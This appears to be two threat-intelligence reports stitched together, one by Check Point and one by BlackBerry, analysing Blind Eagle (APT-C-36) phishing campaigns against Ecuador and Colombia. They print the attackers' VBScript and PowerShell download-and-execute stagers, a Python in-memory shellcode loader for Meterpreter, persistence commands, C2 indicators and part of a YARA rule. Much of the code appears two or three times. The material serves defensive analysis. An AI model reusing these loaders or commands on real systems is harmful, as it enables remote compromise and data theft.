< script language= "VBScript" > CreateObject ( "Wscript.Shell" ) . run "powershell.exe -noexit " "$a1='IEX ((new-object net.webclient).downl';$a2='oadstring(''https://[malicious domain]/wins''))';$a3=" "$a1,$a2" ";IEX(-join $a3)" "" , 0 , true self. close < /script > <script language="VBScript">
CreateObject("Wscript.Shell").run"powershell.exe -noexit ""$a1='IEX ((new-object net.webclient).downl';$a2='oadstring(''https://[malicious domain]/wins''))';$a3=""$a1,$a2"";IEX(-join $a3)""", 0, true
self.close
</script> <script language="VBScript">
CreateObject("Wscript.Shell").run"powershell.exe -noexit ""$a1='IEX ((new-object net.webclient).downl';$a2='oadstring(''https://[malicious domain]/wins''))';$a3=""$a1,$a2"";IEX(-join $a3)""", 0, true
self.close
</script>
Usually campaigns by Blind Eagle abuse legitimate file sharing services such as Mediafire or free dynamic domains like “*.linkpc.net”; this case is different, and the next stage is hosted at the malicious domain upxsystems[.]com.
This next-stage downloads and executes yet another next-stage, a script written in Powershell:
function StartA { [ version ] $OSVersion = [ Environment ] ::OSVersion. Version If ( $OSVersion -gt "10.0" ) { iex ( new -object net. webclient ) . downloadstring ( "https://[malicious domain]/covidV22/ini/w10/0" ) } ElseIf ( $OSVersion -gt "6.3" ) { iex ( new -object net. webclient ) . downloadstring ( "https://[malicious domain]/covidV22/ini/w8/0" ) } ElseIf ( $OSVersion -gt "6.2" ) { iex ( new -object net. webclient ) . downloadstring ( "https://[malicious domain]/covidV22/ini/w8/0" ) } ElseIf ( $OSVersion -gt "6.1" ) { iex ( new -object net. webclient ) . downloadstring ( "http://[malicious domain]/covidV22/ini/w7/0" ) } } StartA function StartA{
[version]$OSVersion = [Environment]::OSVersion.Version
If ($OSVersion -gt "10.0") {
iex (new-object net.webclient).downloadstring("https://[malicious domain]/covidV22/ini/w10/0")
} ElseIf ($OSVersion -gt "6.3") {
iex (new-object net.webclient).downloadstring("https://[malicious domain]/covidV22/ini/w8/0")
} ElseIf ($OSVersion -gt "6.2") {
iex (new-object net.webclient).downloadstring("https://[malicious domain]/covidV22/ini/w8/0")
} ElseIf ($OSVersion -gt "6.1") {
iex (new-object net.webclient).downloadstring("http://[malicious domain]/covidV22/ini/w7/0")
StartA function StartA{
[version]$OSVersion = [Environment]::OSVersion.Version
If ($OSVersion -gt "10.0") {
iex (new-object net.webclient).downloadstring("https://[malicious domain]/covidV22/ini/w10/0")
} ElseIf ($OSVersion -gt "6.3") {
iex (new-object net.webclient).downloadstring("https://[malicious domain]/covidV22/ini/w8/0")
} ElseIf ($OSVersion -gt "6.2") {
iex (new-object net.webclient).downloadstring("https://[malicious domain]/covidV22/ini/w8/0")
} ElseIf ($OSVersion -gt "6.1") {
iex (new-object net.webclient).downloadstring("http://[malicious domain]/covidV22/ini/w7/0")
StartA
The above Powershell checks the system version and downloads the appropriate additional Powershell. This additional OS-specific Powershell checks for installed AV tools and behaves differently based on its findings.
The main difference between each next stage consists in different pieces of code that will try to disable the security solution (for example Windows Defender), but in all cases, regardless of the type of security solution installed on the computer, the next stagewill download a version of python suitable for the target OS and install it:
Function PY (){ if ([ System. IntPtr ] ::Size -eq 4 ) { $progressPreference = 'silentlyContinue' $url = "<https://www.python.org/ftp/python/3.9.9/python-3.9.9-embed-win32.zip>" $output = "$env:PUBLIC\\py.zip" $start_time = Get-Date $wc = New -Object System. Net . WebClient $wc. DownloadFile ( $url, $output ) New -Item "$env:PUBLIC\\py" -type directory $FILE=Get-Item "$env:PUBLIC\\py" -Force $FILE. attributes = 'Hidden' $shell = New -Object -ComObject Shell. Application $zip = $shell. Namespace ( "$env:PUBLIC\\py.zip" ) $items = $zip. items () $shell. Namespace ( "$env:PUBLIC\\py" ) . CopyHere ( $items, 1556 ) start-sleep -Seconds 2 ; Remove-Item "$env:PUBLIC\\py.zip" Remove-Item "$env:USERPROFILE\\PUBLIC\\Local\\Microsoft\\WindowsApps\\*.*" -Recurse -Force Remove-Item "$env:USERPROFILE\\AppData\\Local\\Microsoft\\WindowsApps\\*.*" -Recurse -Force setx PATH "$env:path;$env:PUBLIC\\py" New -Item -Path HKCU:\\Software\\Classes\\Applications\\python. exe \\shell\\open\\command\\ -Value "" "$env:PUBLIC\\py\\python.exe" " " "%1" "" -Force Set-ItemProperty -path 'hkcu:\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache\\' -name "$env:PUBLIC\\py\\python.exe.ApplicationCompany" -value "Python Software Foundation" Set-ItemProperty -path 'hkcu:\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache\\' -name "$env:PUBLIC\\py\\python.exe.FriendlyAppName" -value "Python" } .... Function PY(){
if([System.IntPtr]::Size -eq 4)
$progressPreference = 'silentlyContinue'
$url = "<https://www.python.org/ftp/python/3.9.9/python-3.9.9-embed-win32.zip>"
$output = "$env:PUBLIC\\py.zip"
$start_time = Get-Date
$wc = New-Object System.Net.WebClient
$wc.DownloadFile($url, $output)
New-Item "$env:PUBLIC\\py" -type directory
$FILE=Get-Item "$env:PUBLIC\\py" -Force
$FILE.attributes='Hidden'
$shell = New-Object -ComObject Shell.Application
$zip = $shell.Namespace("$env:PUBLIC\\py.zip")
$items = $zip.items()
$shell.Namespace("$env:PUBLIC\\py").CopyHere($items, 1556)
start-sleep -Seconds 2;
Remove-Item "$env:PUBLIC\\py.zip"
Remove-Item "$env:USERPROFILE\\PUBLIC\\Local\\Microsoft\\WindowsApps\\*.*" -Recurse -Force
Remove-Item "$env:USERPROFILE\\AppData\\Local\\Microsoft\\WindowsApps\\*.*" -Recurse -Force
setx PATH "$env:path;$env:PUBLIC\\py"
New-Item -Path HKCU:\\Software\\Classes\\Applications\\python.exe\\shell\\open\\command\\ -Value """$env:PUBLIC\\py\\python.exe"" ""%1""" -Force
Set-ItemProperty -path 'hkcu:\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache\\' -name "$env:PUBLIC\\py\\python.exe.ApplicationCompany" -value "Python Software Foundation"
Set-ItemProperty -path 'hkcu:\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache\\' -name "$env:PUBLIC\\py\\python.exe.FriendlyAppName" -value "Python"
.... Function PY(){
if([System.IntPtr]::Size -eq 4)
$progressPreference = 'silentlyContinue'
$url = "<https://www.python.org/ftp/python/3.9.9/python-3.9.9-embed-win32.zip>"
$output = "$env:PUBLIC\\py.zip"
$start_time = Get-Date
$wc = New-Object System.Net.WebClient
$wc.DownloadFile($url, $output)
New-Item "$env:PUBLIC\\py" -type directory
$FILE=Get-Item "$env:PUBLIC\\py" -Force
$FILE.attributes='Hidden'
$shell = New-Object -ComObject Shell.Application
$zip = $shell.Namespace("$env:PUBLIC\\py.zip")
$items = $zip.items()
$shell.Namespace("$env:PUBLIC\\py").CopyHere($items, 1556)
start-sleep -Seconds 2;
Remove-Item "$env:PUBLIC\\py.zip"
Remove-Item "$env:USERPROFILE\\PUBLIC\\Local\\Microsoft\\WindowsApps\\*.*" -Recurse -Force
Remove-Item "$env:USERPROFILE\\AppData\\Local\\Microsoft\\WindowsApps\\*.*" -Recurse -Force
setx PATH "$env:path;$env:PUBLIC\\py"
New-Item -Path HKCU:\\Software\\Classes\\Applications\\python.exe\\shell\\open\\command\\ -Value """$env:PUBLIC\\py\\python.exe"" ""%1""" -Force
Set-ItemProperty -path 'hkcu:\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache\\' -name "$env:PUBLIC\\py\\python.exe.ApplicationCompany" -value "Python Software Foundation"
Set-ItemProperty -path 'hkcu:\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache\\' -name "$env:PUBLIC\\py\\python.exe.FriendlyAppName" -value "Python"
It will then download two scripts named and which will be stored in the user folder and for which it will create a scheduled task that will run every 10 minutes. For Windows 7 the task will be created by downloading an XML from the C2 “upxsystems[.]com”, while for Windows 8, 8.1, and 10 the malware will create the task using the cmdlet “New-ScheduledTask*”. mp.py ByAV2.py %Public%
In the case of Windows 7, the task is preconfigured to be executed as System and contains the following description
<Description> Mantiene actualizado tu software de Google. Si esta tarea se desactiva o se detiene, tu software de Google no se mantendrá actualizado, lo que implica que las vulnerabilidades de seguridad que puedan aparecer no podrán arreglarse y es posible que algunas funciones no anden. Esta tarea se desinstala automáticamente si ningún software de Google la utiliza. </Description>
It’s written using the kind of Spanish that is commonly spoken in the target countries, which can be noticed for example with the use of “ es posible que algunas funciones no anden ” instead of “ no se ejecuten ” or any other variation more common in different geographic regions.
The full description can be translated to:
“ Keeps your Google software up to date. If this task is disabled or stopped, your Google software will not be kept up to date, which means that security vulnerabilities that may appear cannot be fixed and some features may not work. This task is automatically uninstalled if no Google software uses it. ”
After downloading the Python scripts and adding persistence, the malware will try to kill all processes related to the infection.
Regarding the two downloaded scripts, both are obfuscated using homebrew encoding that consists of base64 repeated 5 times (we will never, ever, tire of responding to such design choices with “ known to be 5 times as secure as vanilla base64 ”):
After deciphering these strings for each script we obtain two different types of Meterpreter samples.
ByAV2.py
This code consists of an in-memory loader developed in Python, which will load and run a normal Meterpreter sample in DLL format that uses “tcp://systemwin.linkpc[.]net:443” as a C2 server.
Python has a built-in PRNG, and in principle no one is stopping you from constructing a stream cipher based on it, which is what the malware authors do here. The embedded DLL is decrypted using this makeshift “randint stream cipher” with an embedded key (in this construction the key is used as the seed to prime the library). In the grand tradition of cryptography used inside of malware purely to obfuscate buffers using a hardcoded key, the question of how secure this makeshift cipher is has exactly zero consequences. random
.... def decode ( shell_code,keys ) : shell_code_base64 = '' random. seed ( keys ) code = shell_code. split ( ',' ) for item in code: item = int ( item ) shell_code_base64 += chr ( item ^ random. randint ( 0 , 255 )) return shell_code_base64 .... def run ( shellcode ) : ctypes. windll . kernel32 . VirtualAlloc . restype =ctypes. c_uint64 rwxpage = ctypes. windll . kernel32 . VirtualAlloc ( 0 , len ( shellcode ) , 0x3000 , 0x40 ) ctypes. windll . kernel32 . RtlMoveMemory ( ctypes. c_uint64 ( rwxpage ) , ctypes. create_string_buffer ( shellcode ) , len ( shellcode )) handle = ctypes. windll . kernel32 . CreateThread ( 0 , 0 , ctypes. c_uint64 ( rwxpage ) , 0 , 0 , 0 ) ctypes. windll . kernel32 . WaitForSingleObject ( handle, -1 ) if __name__ == '__main__' : ShellCode = '' '"\\x54\\x56\\x70\\x42\\x55\\x6c\\x56\\x49\\x69\\x65\\x56\\x49\\x67\\x2b\\x77" "\\x67\\x53\\x49\\x50\\x6b\\x38\\x4f\\x67\\x41\\x41\\x41\\x41\\x41\\x57\\x30" --More-- "\\x51\\x44\\x67\\x41\\x41\\x43\\x67\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41" "\\x41\\x41\\x41\\x50\\x2f\\x2f\\x2f\\x2f\\x38\\x3d"' '' .... keys = 'Axx8' shellcode = decode ( shell_code,keys ) .... run ( shellcode ) ....
def decode(shell_code,keys):
shell_code_base64 = ''
random.seed(keys)
code = shell_code.split(',')
for item in code:
item = int(item)
shell_code_base64 += chr(item ^ random.randint(0, 255))
return shell_code_base64
def run(shellcode):
ctypes.windll.kernel32.VirtualAlloc.restype=ctypes.c_uint64
rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x3000, 0x40)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage), ctypes.create_string_buffer(shellcode), len(shellcode))
handle = ctypes.windll.kernel32.CreateThread(0, 0, ctypes.c_uint64(rwxpage), 0, 0, 0)
ctypes.windll.kernel32.WaitForSingleObject(handle, -1)
if __name__ == '__main__':
ShellCode = '''"\\x54\\x56\\x70\\x42\\x55\\x6c\\x56\\x49\\x69\\x65\\x56\\x49\\x67\\x2b\\x77"
"\\x67\\x53\\x49\\x50\\x6b\\x38\\x4f\\x67\\x41\\x41\\x41\\x41\\x41\\x57\\x30"
--More--
"\\x51\\x44\\x67\\x41\\x41\\x43\\x67\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41"
"\\x41\\x41\\x41\\x50\\x2f\\x2f\\x2f\\x2f\\x38\\x3d"'''
keys = 'Axx8'
shellcode = decode(shell_code,keys)
run(shellcode) ....
def decode(shell_code,keys):
shell_code_base64 = ''
random.seed(keys)
code = shell_code.split(',')
for item in code:
item = int(item)
shell_code_base64 += chr(item ^ random.randint(0, 255))
return shell_code_base64
def run(shellcode):
ctypes.windll.kernel32.VirtualAlloc.restype=ctypes.c_uint64
rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x3000, 0x40)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage), ctypes.create_string_buffer(shellcode), len(shellcode))
handle = ctypes.windll.kernel32.CreateThread(0, 0, ctypes.c_uint64(rwxpage), 0, 0, 0)
ctypes.windll.kernel32.WaitForSingleObject(handle, -1)
if __name__ == '__main__':
ShellCode = '''"\\x54\\x56\\x70\\x42\\x55\\x6c\\x56\\x49\\x69\\x65\\x56\\x49\\x67\\x2b\\x77"
"\\x67\\x53\\x49\\x50\\x6b\\x38\\x4f\\x67\\x41\\x41\\x41\\x41\\x41\\x57\\x30"
--More--
"\\x51\\x44\\x67\\x41\\x41\\x43\\x67\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41"
"\\x41\\x41\\x41\\x50\\x2f\\x2f\\x2f\\x2f\\x38\\x3d"'''
keys = 'Axx8'
shellcode = decode(shell_code,keys)
run(shellcode)
mp.py
The second script basically consists of another sample of Meterpreter — this time a version developed entirely in Python and using the same C2 server. We can only speculate on why the server was configured to drop the same payload with the same C2 server but written in a different language; possibly one of the samples acts as a plan B in case of the other sample gets detected by some antivirus solution and removed.
CONCLUSION
Blind Eagle is a strange bird among APT groups. Judging by its toolset and usual operations, it is clearly more interested in cybercrime and monetary gain than in espionage; however, unlike most such groups that just attack the entire world indiscriminately, Blind Eagle has a very narrow geographical focus, most of the time limited to a single country. This latest campaign targeting Ecuador highlights how, over the last few years, Blind Eagle has matured as a threat — refining their tools, adding features to leaked code bases, and experimenting with elaborate infection chains and “Living off the Land” as seen with the clever abuse of . If what we’ve seen is any indication, this group is worth keeping an eye on so that victims aren’t blindsided by whatever clever thing they try next. mshta
Check Point’s anti-phishing solutions for office 365 & G suite analyzes all historical emails in order to determine prior trust relations between the sender and receiver, increasing the likelihood of identifying user impersonation or fraudulent messages. Artificial Intelligence (AI) and Indicators of Compromise (IoCs) used in the past train the Harmony Email & Office platform for what to look for in complex zero-day phishing attacks.
8e864940a97206705b29e645a2c2402c2192858357205213567838443572f564 EML Colombia
2702ea04dcbbbc3341eeffb494b692e15a50fbd264b1d676b56242aae3dd9001 PDF Colombia
f80eb2fcefb648f5449c618e83c4261f977b18b979aacac2b318a47e99c19f64 PDF Colombia
68af317ffde8639edf2562481912161cf398f0edba6e06745d90c1359554c76e LHA (zip file)
61685ea4dc4ca4d01e0513d5e23ee04fc9758d6b189325b34d5b16da254cc9f4 EXE
https://www.mediafire[.]com/file/cfnw8rwufptk5jz/migracioncolombiaprocesopendienteid2036521045875referenciawwwmigraciongovco.LHA/file LHA download link
https://gtly[.]to/QvlFV_zgh Dropper domain
https://gtly[.]to/cuOv3gNDi Dropper domain
https://gtly[.]to/dGBeBqd8z Dropper domain (Py2EXE)
laminascol[.]linkpc[.]net QuasarRAT C2
systemwin[.]linkpc[.]net Meterpreter C2
upxsystems[.]com Ecuador mid-infection C2
c63d15fe69a76186e4049960337d8c04c6230e4c2d3d3164d3531674f5f74cdf wins (inicio0)
353406209dea860decac0363d590096e2a8717dd37d6b4d8b0272b02ad82472e wins (PowerShell)
a03259900d4b095d7494944c50d24115c99c54f3c930bea08a43a8f0a1da5a2e 0 (Windows 10 Powershell)
46addee80c4c882b8a6903cced9b6c0130ec327ae8a59c5946bb954ccea64a12 0 (Windows 8 Powershell)
c067869ac346d007a17e2e91c1e04ca0f980e8e9c4fd5c7baa0cb0cc2398fe59 0 (Windows 7 Powershell)
10fd1b81c5774c1cc6c00cc06b3ed181b2d78191c58b8e9b54fa302e4990b13d ByAV2.py
c4ff3fb6a02ca0e51464b1ba161c0a7387b405c78ead528a645d08ad3e696b12 mp.pyBlind Eagle Deploys Fake UUE Files and Fsociety to Target Colombia's Judiciary, Financial, Public, and Law Enforcement Entities
Blind Eagle Deploys Fake UUE Files and Fsociety to Target Colombia's Judiciary, Financial, Public, and Law Enforcement Entities
Summary
APT-C-36, also known as Blind Eagle, has been actively targeting organizations in Colombia and Ecuador since at least 2019. It relies on spear-phishing emails sent to specific and strategic companies to conduct its campaigns. On Feb. 20, the BlackBerry Research and Intelligence team witnessed a new campaign where the threat actor impersonated a Colombian government tax agency to target key industries in Colombia, including health, financial, law enforcement, immigration, and an agency in charge of peace negotiation in the country.
Based on the infector vector and payload deployment mechanism, we also uncovered campaigns targeting Ecuador, Chile, and Spain.
Brief MITRE ATT&CK Information
Tactic
Technique
Weapons
PDF for lures, Visual Basic Scripts, .NET Assemblies injected in memory, Malicious DLLs, PowerShell
Technical Analysis
Context
APT-C-36 is a South American cyber espionage group that has been actively targeting Latin America-based entities over the last few years. Although most of its efforts have been focused on Colombia, according to research conducted by CheckPoint researchers, it has also carried out intrusions against Ecuador.
The main targets of this group for the last few years have been those related to financial and governmental entities.
The initial vector for infection is typically a PDF attachment sent by email. In the case we’ll be examining in this report, the sender of the phishing email opted to use the Blind Carbon Copy (BCC) field instead of the To: field, most likely in an attempt to evade spam filters. They orchestrated their scam to correspondencia@ccb.org.co, which is the official email address listed on the Contact Us page of the Bogota Chamber of Commerce website. Bogotá, of course, is the Capital of Colombia.
The email's Subject line reads, "Obligaciones pendientes - DIAN N.2023-6980070- 39898001" - in English, this means “outstanding obligations,” a lure craftily designed to catch the attention of unsuspecting law-abiding recipients. DIAN is Colombia’s Directorate of National Taxes and Customs - the Dirección de Impuestos y Aduanas Nacionales .
The letter we analyzed states that the recipient is “45 days in arrears” with a tax payment, and tells the target to click a link to view their invoice, which comes in the form of a password-protected PDF. The letter was signed by a (likely fictious) “Roberto Mendoza Ortiz, Department Head .” The phishing email's sender is "alfredo agudelo moreno agudelomorenoalfredo79[at]gmail[.]com," an email address which also appears to have been be made up specifically for this campaign.
We also found another email address associated with this campaign – cobrofactura09291[at]gmail[.]com.
The PDF attached to the phishing email tries to trick the recipient with logos and messages related to the Directorate of National Taxes and Customs. APT-C-36 has regularly used DIAN in their spear-phishing lures over the years, presumably hoping that their targets’ wish to maintain in good standing with the tax authorities would override any natural caution they may have when opening emails sent from an unfamiliar email address.
The PDF contains a URL different from the legitimate hyperlink to DIAN’s website, which is https://www.dian.gov.co/. The URL shown is the real one; however, if the user clicks on it, they are redirected to a different website. Finally, the URL field of this new site contains a URL which downloads a second-stage payload from the public service Discord.
Below is the full intrusion attempt shown step-by-step:
e4d2799f3001a531d15939b1898399b4
fc85d3da6401b0764a2e8a5f55334a7d683ec20fb8210213feb6148f02a30554
What is the DIAN?
The Directorate of National Taxes and Customs is an entity attached to the Ministry of Finance and Public Credit. The DIAN is organized as a Special Administrative Unit of the national order. Its purpose is to help guarantee the fiscal security of the Colombian State and the protection of the national economic public order through the administration and control of due compliance with tax, customs, and exchange obligations. The jurisdiction of the DIAN includes the national territory. It is headquartered in Bogotá, the Capital of Colombia.
Weaponization
Blind Eagle carefully targets its victims with spear-phishing emails, in a similar fashion to other campaigns by the group. It entices its targets to click links contained in the body of the email, or to download a malicious PDF file, which purports to contain information about overdue taxes.
The URL shown on the bait document masquerades as the actual domain of DIAN. However, when clicked, the hyperlink leads to another domain created entirely by the threat actor using the public service website[.]org. The link redirects the target to dian.server[.]tl. This crafty technique is known as URL phishing .
Figure 2: Content of the bait email, masquerading as the Directorate of National Taxes and Customs
In English, the bait document reads:
Dear taxpayer,
At DIAN we maintain our commitment to provide you with the necessary assistance and services so that you can comply in a timely and correct manner with your tax obligations.
For this reason, we remind you that you are in arrears with your obligations. for an amount owed of THREE MILLION TWO HUNDRED FIFTY-TWO THOUSAND ONE HUNDRED FORTY PESOS, with 45 days in arrears due to the lack of commitment in your financial obligations regulated in law 0248 of the year 2005 numeral 12.
Next, we put at your disposal the Virtual PDF with all the details of your obligations generated to date.
Submit a foreclosure process and pay on time.
In the following link you will find the invoice in PDF format.
To view the document, enter the password: A2023
Cordially,
ROBERTO MENDOZA ORTIZ
Department Head
When the victim clicks on the masked link in the email, they are redirected to dian.server[.]tl. The threat actor carefully crafted this webpage to deceive the victim into believing they are interacting with the real DIAN.
Figure 3: Content presented to the user on the fake webpage dian.server[.]tl
Looking at the code of the webpage, the content presented to the users is loaded from website[.]org/s8Xwt2 or website[.]org/render/s8Xwt2, and not from dian.server[.]tl. This is accomplished by using an iframe resized to the 100% of the screen.
Figure 4: The content the victim sees is shown on the left, which is loaded from the resource shown on the right
The fake DIAN website page contains a button that encourages the victim to download a PDF to view what the site claims to be pending tax invoices. Clicking the blue button initiates the download of a malicious file from the Discord content delivery network (CDN), which the attackers are abusing in this phishing scam.
hxxps://cdn.discordapp[.]com/attachments/1067819339090243727/1071063499494666240/Asuntos_DIAN_N34000137L287004P08899997012-03-02-2023-pdf[.]uue
hxxps://cdn.discordapp[.]com/attachments/1066009888083431506/1070342535702130759/Asuntos_DIAN_N6440005403992837L2088970004-01-02-2023-pdf[.]uue
hxxps://cdn.discordapp[.]com/attachments/1072851594812600351/1072851643583967272/Asuntos_DIAN_N3663000227L2870000002456880-08-02-2023-pdf[.]uue
The downloaded file tries to trick the user into manually adding the word “pdf” at the end of the filename. However, the real extension is actually “uue.” This is a file extension WinRAR opens by default. Behind the extension there is a .RAR archive.
B432202CF7F00B4A4CBE377C284F3F28
6D9D0EB5E8E69FFE9914C63676D293DA1B7D3B7B9F3D2C8035ABE0A3DE8B9FCA
It’s necessary to decompress the contents of the .uue file to continue with the infection chain. The compressed .uue file contains yet another file inside it. The inner file uses the same naming convention as the parent, but in this case, the new file is a Visual Basic Script (VBS).
6BEF68F58AFCFDD93943AFCC894F8740
430BE2A37BAC2173CF47CA1376126A3E78A94904DBC5F304576D87F5A17ED366
The file-extracted VBS script is executed via wscript.exe once the user double-clicks the file, so an element of user-interaction is involved in executing the attack. Upon execution, the infection chain starts automatically and carries out various actions within the system without any further user input, as seen below in figure 7.
Figure 7: Process tree once the VBS script is manually executed by the user
The VBS script's content is encoded but easy for a researcher to understand and decode.
Figure 8: Content of the VBS script
The VBS script contains a significant amount of junk code, but has several replace functions to construct the PowerShell execution.
Figure 9: Replace functions to replace junk code by the original behavior
The content was built under the variable “OXVTEUOWQPEFWQ”, as shown in figure 9 above. After creating that content, figure 8 shows the variable “YISMXXAPAUXCGFI”, which is set as a WScript object.
After decoding the code, to better understand its behavior, we can see that a part of the logic - the URL shown in the above image - is actually reversed.
Figure 11: A closer look at part of the VBS code, decoded
The final payload executed is powershell.exe, with the following command line parameters:
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" [Byte[]] $rOWg = [system.Convert]::FromBase64string((New-Object Net.WebClient).DownloadString('hxxp://172.174.176[.]153/dll/Dll.ppam'));[System.AppDomain]::CurrentDomain.Load($rOWg).GetType('Fiber.Home').GetMethod('VAI').Invoke($null, [object[]] ('txt.ysa/3383903646370010701/3046420575525667501/stnemhcatta/moc.ppadrocsid.ndc//:sptth'))
First, PowerShell downloads and executes the decoded base64 content of hxxp://172.174.176[.]153/dll/Dll.ppam, which is a .NET DLL encoded, as shown in figure 12.
Figure 12: Base64 content from the server, called using powershell.exe
Next, it uses GetType(‘Fiber.home’).GetMethod(‘VAI’), to load the VAI method from the DLL downloaded previously. The logic of this method is as follows:
To create a copy of the Visual Basic Script called “Asuntos_DIAN_N°6440005403992837L2088970004-01-02-2023-pdf.vbs” in C:\Windows\Temp\OneDrive.vbs if it already doesn’t exist using PowerShell.
Powershell.exe -WindowStyle Hidden Copy-Item -Path *.vbs -Destination C:\Windows\Temp\OneDrive.vbs
Reverse the text of the second URL in the PowerShell command and download its content (hxxps://cdn.discordapp[.]com/attachments/1057665255750246403/1070100736463093833/asy[.]txt (AsyncRAT payload)
Create a string with the content “C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe”
Load the Fsociety DLL into memory, passing two parameters:
RegSvcs path
AsyncRAT payload
To better understand the PowerShell execution, the following image demonstrates the sequence of loading DLLs dynamically in memory until the final goal, which is to load AsyncRAT into memory. AsyncRAT is one of the most popular open-source remote access Trojans (RATs) on the threat landscape today.
Figure 13: Sequence of loaded DLLs after PowerShell execution
The following image is part of all the behavior described above, related to the first DLL loaded using the PowerShell command spawned by the VBS Script and calling the ‘VAI’ method.
Figure 14: Part of the method VAI previously called by PowerShell
As mentioned, Fsociety.dll is used to load the final payload of AsyncRAT, which is downloaded from Discord.
Blind Eagle mainly uses AsyncRAT, njRAT , QuasarRAT , LimeRAT, and RemcosRAT in its campaigns. A RAT is a remote access tool a network admin may use to remotely administrate the node. So a malicious RAT installed on a victim’s machine enables the threat actor to connect to the infected endpoint any time they like, and to perform any operations they desire.
Figure 15: Fsociety.dll is used to load AsyncRAT in memory
The “Ande” function called in the Fsociety.dll contains the following code:
C75F9D3DA98E57B973077FDE8EC3780F
5399BF1F18AFCC125007D127493082005421C5DDEBC34697313D62D8BC88DAEC
07AF8778DE9F2BC53899AAC7AD671A72
03B7D19202F596FE4DC556B7DA818F0F76195912E29D728B14863DDA7B91D9B5
5E518B80C701E17259F3E7323EFFC83F
64A08714BD5D04DA6E2476A46EA620E3F7D2C8A438EDA8110C3F1917D63DFCFC
AsyncRAT contains a configuration method with information that is used during the intrusion attempt. This information is encrypted using Base64 and AES256.
Figure 17: AsyncRAT configuration encrypted
Once the configuration is decrypted, it contains information about the Command-and-Control (C2) to transfer commands and files between client and server.
Figure 18: AsyncRAT configuration decrypted
Also, between the configuration, it was possible to obtain the X.509 certificates used for communication with the C2.
Figure 19: Certificate extracted from the AsyncRAT config
AsyncRAT can establish persistence in two different ways, depending on whether a user loaded it with admin privileges or not. A copy of itself is first created under C:\Users\<user>\AppData\Roaming\MRR.exe.
Figure 20: Creation of MRR in AppData folder
1. If the user who executed it was an admin, then AsyncRAT can create a scheduled task using the process schtasks.exe, with the following command line:
a. "C:\Windows\System32\cmd.exe" /c schtasks /create /f /sc onlogon /rl highest /tn "MRR" /tr '"C:\Users\<user>\AppData\Roaming\MRR.exe"' & exit'
Figure 22: Command line executed to create scheduled task and run AsyncRAT
2. If the user is not an admin, then AsyncRAT can create a registry key to execute the binary every time the system is started:
a. Key: KCU\Software\Microsoft\Windows\CurrentVersion\Run\MRR
b. Value: C:\Users\<user>\AppData\Roaming\MRR.exe
Figure 23: Registry key created to execute the AsyncRAT Payload
An interesting part that always happens, regardless of whether the user is admin or not, is the creation of a .bat file in the user’s Temp directory to perform the following actions:
a. Timeout.exe execution for three seconds
b. Run the AsyncRAT payload from AppData folder
c. Delete the .bat file
Figure 25: Execution of cmd.exe to load the .bat file from tmp folder
We could determine that the .bat filename is randomly generated using the regular expression after several executions of this sample. The structure is like the next one: .*tmp[a-zA-Z1-9]{4}.tmp.bat.
Figure 26: Persistence methods used by AsyncRAT
Network Infrastructure
In this case, the victim’s machine starts communicating with the DuckDNS server to receive and execute commands, exfiltrate information, and perform any other action desired by the threat actor. As seen in figure 18 above, the server used is asy1543.duckdns[.]org:1543.
Figure 27: Communication started between victim’s machine and the threat actor’s C2
During our investigation, the resolution of the DuckDNS domain was changed to different IP addresses. Initially, the IP that resolves the domain was a VPN/Proxy service 46.246.86[.]3. While conducting the investigation, we discovered another IP with the same purpose, 46.246.12[.]6.
Entity
Value
Description
Blind Eagle/ APT-C-36 uses Dynamic DNS (DDNS) services, such as DuckDNS, for most campaigns to connect its implemented RATs to the infrastructure they control to send and receive commands. DuckDNS additionally allows for high IP resolution rotation and the launch of new subdomains under this well-known DDNS
The application web hosted under hxxp://172.174.176[.]153/ had two main directories where it stored information to be used during the intrusion as the user downloads and executes files.
The first directory was hxxp://172.174.176[.]153/dll/, storing several DLLs used during the intrusion.
Figure 28: Index of APT-C-36's /dll directory
Another directory is found at hxxp://172.174.176[.]153/rump/ and stores another DLL, in this case, related to Fsociety:
Figure 29: index of /rump directory
Targets
Blind Eagle/ APT-C-36's targets include health, public, financial, judiciary, and law enforcement entities in Colombia.
Among the countries where we have seen Blind Eagle activity in the last few months, specifically distributing the UUE file types with different themes, include:
Colombia
Ecuador
Chile
Spain
This is consistent with the use of the Spanish language in the group’s spear-phishing emails. Most countries in South America use Spanish (apart from Brazil), which matches the threat actor’s locale and the names in the bait document.
Attribution
APT-C-36 is a South American-based threat actor active since at least 2019. The group continues to concentrate its operations within a Hispanic geographic region, with its main targets being government institutions and other organizations primarily based in Colombia.
The use of specific tools and artifacts, along with the type and configuration of the network infrastructure documented in this report, combined with the tactics, techniques & procedures (TTPs) used to deploy them, all closely align with previously attributed campaigns by this group.
That, coupled with the geolocation and nature of the targets seen in this campaign, leads us to ascertain, at the very least, a moderate level of confidence that this campaign was conducted by APT-C-36.
Conclusions
This campaign continues to operate for the purposes of information theft and espionage. The modus operandi used has mostly stayed the same as the group’s previous efforts – it is very simple, which may mean that this group is comfortable with its way of launching campaigns via phishing emails, and feels confident in using them because they continue to work.
Over the next few months, we will likely continue to see new targets for this group, using new ways to deceive their victims.
APPENDIX 1 - Applied Countermeasures
Yara Rules
rule targeted_BlindEagle_Loader : Fsociety
meta:
description = "Rule to detect BlindEagle malicious Loader"
author = "The BlackBerry Research & Intelligence team"
date = "2023-02-07"
last_modified = "2023-02-22"
distribution = "TLP:White"
version = "1.0"
strings:
$h0 = {6449640053697A655F00526573657276656431004465736B746F70005469746C65006477580064775900647758536
